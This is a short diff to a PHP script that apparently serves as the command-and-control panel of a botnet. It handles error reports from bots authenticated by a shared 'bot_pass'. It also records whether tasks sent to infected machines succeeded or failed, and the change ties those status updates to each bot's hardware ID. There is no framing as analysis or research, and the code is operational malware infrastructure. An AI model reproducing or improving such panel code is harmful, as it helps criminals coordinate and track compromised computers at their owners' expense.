@@ -17,14 +17,14 @@ if ($_GET && isset($_GET['err']) && isset($_GET['os'])&& isset($_GET['pwd']) && 
 	db_query("INSERT INTO `error`(`os`, `err`) VALUES(:1, :2)", $_GET['os'], nl2br(htmlentities($_GET['err'])));
 	die('Error stored');
 }
-elseif ($_GET && isset($_GET['success']) && isset($_GET['pwd']) && $_GET['pwd'] == $GLOBALS['bot_pass'])
+elseif ($_GET && isset($_GET['success']) && isset($_GET['pwd']) && isset($_GET['hwid']) && $_GET['pwd'] == $GLOBALS['bot_pass'])
 {
-	db_query("UPDATE `sentTasks` SET `status` = 1 WHERE `tid` = :1", $_GET['success']);
+	db_query("UPDATE `sentTasks` SET `status` = 1 WHERE `tid` = :1 AND `hwid` = :2", $_GET['success'], $_GET['hwid']);
 	die('Task updated');
 }
-elseif ($_GET && isset($_GET['failor']) && isset($_GET['pwd']) && $_GET['pwd'] == $GLOBALS['bot_pass'])
+elseif ($_GET && isset($_GET['failor']) && isset($_GET['pwd']) && isset($_GET['hwid']) && $_GET['pwd'] == $GLOBALS['bot_pass'])
 {
-	db_query("UPDATE `sentTasks` SET `status` = -1 WHERE `tid` = :1", $_GET['failor']);
+	db_query("UPDATE `sentTasks` SET `status` = -1 WHERE `tid` = :1 AND `hwid` = :2", $_GET['failor'], $_GET['hwid']);
 	die('Task updated');
 }
 elseif ($_GET && isset($_GET['hwid']) && isset($_GET['os']) && isset($_GET['pwd']) && $_GET['pwd'] == $GLOBALS['bot_pass'])
